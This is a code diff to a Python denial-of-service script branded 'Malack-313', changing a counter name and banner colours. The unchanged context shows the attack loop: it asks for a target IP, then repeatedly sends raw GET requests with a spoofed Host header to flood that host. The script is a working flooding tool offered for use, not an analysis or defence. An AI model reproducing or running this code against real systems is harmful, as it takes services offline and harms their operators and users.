@@ -15,7 +15,7 @@ def ddos():
             continue;
         else:
             break;
-    attack_num = 0
+    attack_ip = 0
     trget = str(input(Fore.RED + Style.BRIGHT + "ENTER IP OF THE HOST :  "))
     fake = '192.178.1.38'
     #port = 80( default http port is 80)
@@ -49,8 +49,8 @@ def ddos():
                 s.sendto(("GET /" + trget + " HTTP/1.1\r\n").encode("ascii"), (trget, port))
                 s.sendto(('Host: ' + fake + '\r\n\r\n').encode('ascii'), (trget, port))
 
-                attack_num += 2
-                print("[💢]  \033[0;36mMalack-313 \033[0;31m \033[1;37m▒ \033[1;33mGET \033[1;37mattack \033[1;34m=> \033[1;35m▒" +str(ip)+ ")")
+                attack_ip += 2
+                print("[💢]  \033[0;36mMalack-313 \033[0;31m \033[1;37m▒ \033[1;33mGET \033[1;37mattack \033[1;34m=> \033[1;35m▒" +str(ip)+ "\033[0m")
             except socket.error:
                 print("[💥]\033[1;35m Finnaly attack \033[0;31m Check ip in check host \033[0m")
                 break
@@ -78,12 +78,12 @@ def print_red_centered_art():
 
 \033[33m══════════════════════ \033[37mJ A N C O K Z O S A N\033[33m ═════════════════════
 """)
-    red_art = f"{Fore.GREEN}{art}{Style.RESET_ALL}"  # Set the text color to red_art
+    red_art = f"{Fore.GREEN}{Style.RESET_ALL}"  # Set the text color to red_art
     print(red_art.center(80))  # Adjust the width (80 characters) to match your terminal size
     #red_art2 = f"{Fore.RED}{art2}{Style.RESET_ALL}"
-    red_art2 = f"{Fore.YELLOW}{Style.RESET_ALL}"
+    red_art2 = f"{Fore.LIGHTCYAN_EX}{Style.RESET_ALL}"
     print((80))
-    print(Fore.YELLOW + Style.BRIGHT + "[Malack-313 dedication and struggle for PALESTINE]")
+    print(Fore.CYAN + Style.BRIGHT + "[Malack-313 dedication and struggle for PALESTINE]")
 if __name__ == "__main__":
     print_red_centered_art()
 def menu():
